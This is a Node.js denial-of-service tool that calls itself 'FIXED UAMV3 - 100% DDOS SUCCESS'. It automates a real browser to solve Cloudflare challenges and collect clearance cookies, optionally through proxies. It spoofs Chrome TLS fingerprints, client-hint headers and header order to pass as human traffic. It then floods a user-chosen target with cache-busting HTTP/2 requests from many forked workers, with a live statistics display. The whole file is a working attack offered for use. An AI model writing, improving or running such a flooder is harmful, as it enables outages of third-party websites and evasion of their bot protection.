const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const HPACK = require('hpack');

function getAdvancedChromeTlsOptions(parsedTarget) {
    const chromeProfiles = [
        {
            version: 131,
            ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
                'ECDHE-RSA-AES128-SHA', 'ECDHE-RSA-AES256-SHA', 'AES128-GCM-SHA256', 'AES256-GCM-SHA384',
                'AES128-SHA', 'AES256-SHA'
            ]
        },
        {
            version: 130,
            ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
                'AES128-GCM-SHA256', 'AES256-GCM-SHA384'
            ]
        },
        {
            version: 129,
            ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
                'AES128-GCM-SHA256', 'AES256-GCM-SHA384', 'AES128-SHA', 'AES256-SHA'
            ]
        }
    ];

    const profile = chromeProfiles[Math.floor(Math.random() * chromeProfiles.length)];
    const supportedGroups = ['x25519', 'secp256r1', 'secp384r1'];
    const sigAlgs = [
        'ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256', 'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha384', 'rsa_pkcs1_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha512'
    ];
    
    const shuffledCiphers = [...profile.ciphers];
    if (Math.random() < 0.05) {
        const i = shuffledCiphers.length - 1, j = Math.max(0, i - 1);
        [shuffledCiphers[i], shuffledCiphers[j]] = [shuffledCiphers[j], shuffledCiphers[i]];
    }

    return {
        ciphers: shuffledCiphers.join(':'),
        sigalgs: sigAlgs.join(':'),
        groups: supportedGroups.join(':'),
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET |
                       crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 |
                       crypto.constants.SSL_OP_NO_COMPRESSION,
        rejectUnauthorized: false,
        servername: parsedTarget.host
    };
}

function generateAdvancedBrowserHeaders(userAgentFromBypass) {
    const chromeVersion = parseInt((userAgentFromBypass.match(/Chrome\/(\d+)/) || [])[1] || '131');
    const fullVersion = `${chromeVersion}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)}`;

    const brandTemplates = [
        `"Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}", "Not-A.Brand";v="99"`,
        `"Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}", "Not;A=Brand";v="8"`,
        `"Not)A;Brand";v="99", "Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}"`
    ];
    const brandValue = brandTemplates[Math.floor(Math.random() * brandTemplates.length)];

    const platforms = ['"Windows"', '"macOS"', '"Linux"', '"Android"'];
    const platform = platforms[Math.floor(Math.random() * platforms.length)];

    const archs = ['"x86"', '"arm"', '"x64"', '""'];
    const arch = archs[Math.floor(Math.random() * archs.length)];

    const models = ['""', '"Intel Mac OS X 10_15_7"', '"Windows NT 10.0; Win64; x64"', '"SM-G960F"'];
    const model = models[Math.floor(Math.random() * models.length)];

    const bitness = ['"64"', '"32"', '""'][Math.floor(Math.random() * 3)];

    const colorSchemes = ['light', 'dark', 'no-preference'];
    const colorScheme = colorSchemes[Math.floor(Math.random() * colorSchemes.length)];

    const languages = [
        "en-US,en;q=0.9,vi;q=0.8",
        "en-GB,en;q=0.9",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "es-ES,es;q=0.9,en;q=0.8"
    ];
    const acceptLanguage = languages[Math.floor(Math.random() * languages.length)];

    return {
        "sec-ch-ua": brandValue,
        "sec-ch-ua-mobile": platform === '"Android"' ? "?1" : "?0",
        "sec-ch-ua-platform": platform,
        "sec-ch-ua-arch": arch,
        "sec-ch-ua-model": model,
        "sec-ch-ua-platform-version": `"${Math.floor(Math.random() * 15) + 10}.0.0"`,
        "sec-ch-ua-full-version-list": `"Not)A;Brand";v="${fullVersion}", "Chromium";v="${fullVersion}", "Google Chrome";v="${fullVersion}"`,
        "sec-ch-ua-bitness": bitness,
        "sec-ch-prefers-color-scheme": colorScheme,
        "upgrade-insecure-requests": "1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": acceptLanguage,
        "origin": `https://${parsedTarget.host}`,
        "referer": Math.random() < 0.5 ? `https://${parsedTarget.host}/` : ""
    };
}

function getBrowserLikeHeaderOrder() {
    const baseOrder = [
        ':method',
        ':authority',
        ':scheme',
        ':path',
        'user-agent',
        'sec-ch-ua',
        'sec-ch-ua-mobile',
        'sec-ch-ua-platform',
        'sec-ch-ua-arch',
        'sec-ch-ua-model',
        'sec-ch-ua-platform-version',
        'sec-ch-ua-full-version-list',
        'sec-ch-ua-bitness',
        'sec-ch-prefers-color-scheme',
        'upgrade-insecure-requests',
        'accept',
        'sec-fetch-site',
        'sec-fetch-mode',
        'sec-fetch-user',
        'sec-fetch-dest',
        'accept-encoding',
        'accept-language',
        'origin',
        'referer',
        'cookie'
    ];
    const secChStart = baseOrder.indexOf('sec-ch-ua');
    const secChEnd = baseOrder.indexOf('upgrade-insecure-requests');
    const secChSection = baseOrder.slice(secChStart, secChEnd);
    if (Math.random() < 0.2) {
        for (let i = secChSection.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [secChSection[i], secChSection[j]] = [secChSection[j], secChSection[i]];
        }
    }
    return [...baseOrder.slice(0, secChStart), ...secChSection, ...baseOrder.slice(secChEnd)];
}

function buildHeadersInOrder(headersObj, order) {
    const orderedHeaders = {};
    order.forEach(key => {
        if (headersObj.hasOwnProperty(key)) {
            orderedHeaders[key] = headersObj[key];
        }
    });
    Object.keys(headersObj).forEach(key => {
        if (!order.includes(key)) {
            orderedHeaders[key] = headersObj[key];
        }
    });
    return orderedHeaders;
}

function randstr(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function generateCacheBuster() {
    const params = ['_', 'cb', 't', 'cache', 'v'];
    const param = params[Math.floor(Math.random() * params.length)];
    const value = Date.now() + Math.floor(Math.random() * 10000);
    return `${param}=${value}`;
}

function loadProxies(proxyFile) {
    if (!proxyFile) return [];
    try {
        return fs.readFileSync(proxyFile, 'utf8').split('\n').filter(line => line.trim());
    } catch (e) {
        return [];
    }
}

async function bypassCloudflareOnce(attemptNum = 1, proxy = null) {
    let response = null;
    let browser = null;
    let page = null;
    try {
        const connectOptions = {
            headless: 'auto',
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu', '--window-size=1920,1080'],
            turnstile: true
        };
        if (proxy) {
            connectOptions.args.push(`--proxy-server=${proxy}`);
        }
        response = await connect(connectOptions);
        browser = response.browser;
        page = response.page;
        await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 45000 });
        
        let challengeCompleted = false;
        let waitCount = 0;
        while (!challengeCompleted) {
            await new Promise(r => setTimeout(r, 500));
            waitCount++;
            const cookies = await page.cookies();
            if (cookies.some(c => c.name === "cf_clearance")) {
                challengeCompleted = true;
                break;
            }
            if (waitCount % 20 === 0) {}
        }

        const cookies = await page.cookies();
        const userAgent = await page.evaluate(() => navigator.userAgent);
        await browser.close();
        
        if (!cookies.some(c => c.name === "cf_clearance")) {
            throw new Error("CF_CLEARANCE COOKIE NOT FOUND AFTER WAIT.");
        }

        return { cookies, userAgent, success: true, attemptNum, proxy };
    } catch (error) {
        try { if (browser) await browser.close(); } catch (e) {}
        return { cookies: [], userAgent: "", success: false, attemptNum, proxy };
    }
}

async function bypassCloudflareParallel(totalCount, proxies) {
    if (!proxies.length) {
        const results = [];
        let attemptCount = 0;
        const batchSize = 3;
        
        while (results.length < totalCount) {
            const remaining = totalCount - results.length;
            const currentBatchSize = Math.min(batchSize, remaining);
            
            const batchPromises = Array.from({ length: currentBatchSize }, () => bypassCloudflareOnce(++attemptCount));
            const batchResults = await Promise.all(batchPromises);
            
            for (const result of batchResults) {
                if (result.success && result.cookies.length > 0) {
                    results.push(result);
                }
            }
            if (results.length < totalCount) await new Promise(r => setTimeout(r, 2000));
        }
        return results.length > 0 ? results : [{ cookies: [], userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" }];
    } else {
        const results = [];
        const selectedProxies = Array.from({ length: Math.min(args.Rate, proxies.length) }, () => proxies[Math.floor(Math.random() * proxies.length)]);
        
        for (const proxy of selectedProxies) {
            const result = await bypassCloudflareOnce(1, proxy);
            if (result.success && result.cookies.length > 0) {
                results.push(result);
                runFlooderWithProxy(result, proxy);
            }
        }
        return results.length > 0 ? results : [{ cookies: [], userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" }];
    }
}

async function runFlooder(bypassInfo) {
    const cookieString = bypassInfo.cookies.map(c => `${c.name}=${c.value}`).join("; ");
    const advancedHeaders = generateAdvancedBrowserHeaders(bypassInfo.userAgent);
    const tlsOptions = getAdvancedChromeTlsOptions(parsedTarget);

    const client = http2.connect(args.target, {
        createConnection: (authority, option) => {
            return tls.connect({
                ...tlsOptions,
                port: 443,
                host: parsedTarget.host,
                ALPNProtocols: ['h2']
            });
        },
        settings: {
            headerTableSize: 262144,
            maxConcurrentStreams: 100,
            initialWindowSize: 6291456,
            maxHeaderListSize: 4096
        }
    });

    const connectionId = Math.random().toString(36).substring(2);
    global.activeConnections.add(connectionId);

    client.on('connect', async () => {
        const attackInterval = setInterval(async () => {
            if (client.destroyed) {
                clearInterval(attackInterval);
                return;
            }
            try {
                for (let i = 0; i < args.Rate; i++) {
                    await new Promise(r => setTimeout(r, 50 + Math.floor(Math.random() * 150)));

                    const querySeparator = parsedTarget.path.includes('?') ? '&' : '?';
                    const pathWithBuster = parsedTarget.path + querySeparator + generateCacheBuster();

                    let headers = {
                        ":method": "GET",
                        ":authority": parsedTarget.host,
                        ":scheme": "https",
                        ":path": pathWithBuster,
                        "user-agent": bypassInfo.userAgent,
                        "cookie": cookieString,
                        ...advancedHeaders
                    };

                    const headerOrder = getBrowserLikeHeaderOrder();
                    headers = buildHeadersInOrder(headers, headerOrder);

                    const req = client.request(headers);

                    req.on('response', (resHeaders) => {
                        const status = resHeaders[':status'];
                        if (!global.statuses[status]) global.statuses[status] = 0;
                        global.statuses[status]++;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                        req.close();
                    });

                    req.on('error', () => {
                        if (!global.statuses["ERROR"]) global.statuses["ERROR"] = 0;
                        global.statuses["ERROR"]++;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                        req.close();
                    });

                    req.end();
                }
            } catch (e) {}
        }, 1000);

        setTimeout(() => {
            clearInterval(attackInterval);
            client.close();
        }, 30000);
    });

    const cleanup = () => {
        global.activeConnections.delete(connectionId);
        client.destroy();
    };
    client.on('error', cleanup);
    client.on('close', cleanup);
}

async function runFlooderWithProxy(bypassInfo, proxy) {
    const cookieString = bypassInfo.cookies.map(c => `${c.name}=${c.value}`).join("; ");
    const advancedHeaders = generateAdvancedBrowserHeaders(bypassInfo.userAgent);
    const tlsOptions = getAdvancedChromeTlsOptions(parsedTarget);

    const client = http2.connect(args.target, {
        createConnection: (authority, option) => {
            return tls.connect({
                ...tlsOptions,
                port: 443,
                host: parsedTarget.host,
                ALPNProtocols: ['h2'],
                proxy: proxy
            });
        },
        settings: {
            headerTableSize: 262144,
            maxConcurrentStreams: 100,
            initialWindowSize: 6291456,
            maxHeaderListSize: 4096
        }
    });

    const connectionId = Math.random().toString(36).substring(2);
    global.activeConnections.add(connectionId);

    client.on('connect', async () => {
        const attackInterval = setInterval(async () => {
            if (client.destroyed) {
                clearInterval(attackInterval);
                return;
            }
            try {
                for (let i = 0; i < args.Rate; i++) {
                    await new Promise(r => setTimeout(r, 50 + Math.floor(Math.random() * 150)));

                    const querySeparator = parsedTarget.path.includes('?') ? '&' : '?';
                    const pathWithBuster = parsedTarget.path + querySeparator + generateCacheBuster();

                    let headers = {
                        ":method": "GET",
                        ":authority": parsedTarget.host,
                        ":scheme": "https",
                        ":path": pathWithBuster,
                        "user-agent": bypassInfo.userAgent,
                        "cookie": cookieString,
                        ...advancedHeaders
                    };

                    const headerOrder = getBrowserLikeHeaderOrder();
                    headers = buildHeadersInOrder(headers, headerOrder);

                    const req = client.request(headers);

                    req.on('response', (resHeaders) => {
                        const status = resHeaders[':status'];
                        if (!global.statuses[status]) global.statuses[status] = 0;
                        global.statuses[status]++;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                        req.close();
                    });

                    req.on('error', () => {
                        if (!global.statuses["ERROR"]) global.statuses["ERROR"] = 0;
                        global.statuses["ERROR"]++;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                        req.close();
                    });

                    req.end();
                }
            } catch (e) {}
        }, 1000);

        setTimeout(() => {
            clearInterval(attackInterval);
            client.close();
        }, 30000);
    });

    const cleanup = () => {
        global.activeConnections.delete(connectionId);
        client.destroy();
    };
    client.on('error', cleanup);
    client.on('close', cleanup);
}

function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);
    
    console.clear();
    console.log("[+] FIXED UAMV3 - 100% DDOS SUCCESS");
    console.log(`[+] TARGET: ${args.target}`);
    console.log(`[+] TIME: ${elapsed}S / ${args.time}S`);
    console.log(`[+] REMAINING: ${remaining}S`);
    console.log(`[+] CONFIG: RATE: ${args.Rate}/S | THREADS: ${args.threads} | SESSION: ${global.bypassData ? global.bypassData.length : 0} / ${args.cookieCount} REQUESTED`);
    console.log(`[+] PROXY FILE: ${args.proxyFile || 'None'}`);

    let totalStatuses = {};
    let totalRequests = 0;
    for (let w in global.workers) {
        if (global.workers[w][0].state == 'online') {
            const msg = global.workers[w][1];
            for (let st of msg.statusesQ) {
                for (let code in st) {
                    if (!totalStatuses[code]) totalStatuses[code] = 0;
                    totalStatuses[code] += st[code];
                }
            }
            totalRequests += msg.totalRequests || 0;
        }
    }
    console.log(`[+] STATISTICS:`);
    console.log(`   [+] TOTAL REQUESTS: ${totalRequests}`);
    console.log(`   [+] RATE: ${elapsed > 0 ? (totalRequests / elapsed).toFixed(2) : 0} REQ/S`);
    console.log(`   [+] STATUS CODES:`, totalStatuses);

    const progress = Math.floor((elapsed / args.time) * 30);
    const progressBar = "█".repeat(progress) + "░".repeat(30 - progress);
    console.log(`\n[+] PROGRESS: [${progressBar}]`);
}

global.activeConnections = new Set();
global.workers = {};
global.startTime = Date.now();
global.bypassData = [];

if (process.argv.length < 6) {
    console.log(`[+] USAGE: NODE ${process.argv[1]} <TARGET> <TIME> <RATE> <THREADS> <COOKIECOUNT> [PROXYFILE]`);
    console.log(`[+] EXAMPLE: NODE ${process.argv[1]} HTTPS://EXAMPLE.COM 60 100 8 5 proxies.txt`);
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 2,
    proxyFile: process.argv[7] || null
};

const parsedTarget = url.parse(args.target);
const proxies = loadProxies(args.proxyFile);

if (cluster.isMaster) {
    console.clear();
    console.log("[+] FIXED UAMV3 - 100% DDOS SUCCESS");
    
    (async () => {
        const bypassResults = await bypassCloudflareParallel(args.cookieCount, proxies);
        global.bypassData = bypassResults;
        
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ type: 'bypassData', data: bypassResults });
        }
        
        const statsInterval = setInterval(displayStats, 1000);
        
        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.workers[worker.id] = [worker, message];
            }
        });
        
        cluster.on('exit', (worker) => {
            if (Date.now() - global.startTime < args.time * 1000) {
                const newWorker = cluster.fork();
                newWorker.send({ type: 'bypassData', data: global.bypassData });
            }
        });
        
        setTimeout(() => {
            clearInterval(statsInterval);
            console.log("[+] ATTACK COMPLETED!");
            process.exit(0);
        }, args.time * 1000);
    })();
    
} else {
    let statusesQ = [];
    global.totalRequests = 0;
    global.statuses = {};
    
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            global.bypassData = msg.data;
            setInterval(() => {
                for (const bypassInfo of global.bypassData) {
                    if (bypassInfo.proxy) {
                        runFlooderWithProxy(bypassInfo, bypassInfo.proxy);
                    } else {
                        runFlooder(bypassInfo);
                    }
                }
            }, 250);
            
            setInterval(() => {
                if (Object.keys(global.statuses).length > 0) {
                    if (statusesQ.length >= 4) statusesQ.shift();
                    statusesQ.push({...global.statuses});
                    global.statuses = {};
                }
                process.send({
                    type: 'stats',
                    statusesQ: statusesQ,
                    totalRequests: global.totalRequests
                });
            }, 250);
        }
    });
    
    setTimeout(() => process.exit(0), args.time * 1000);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
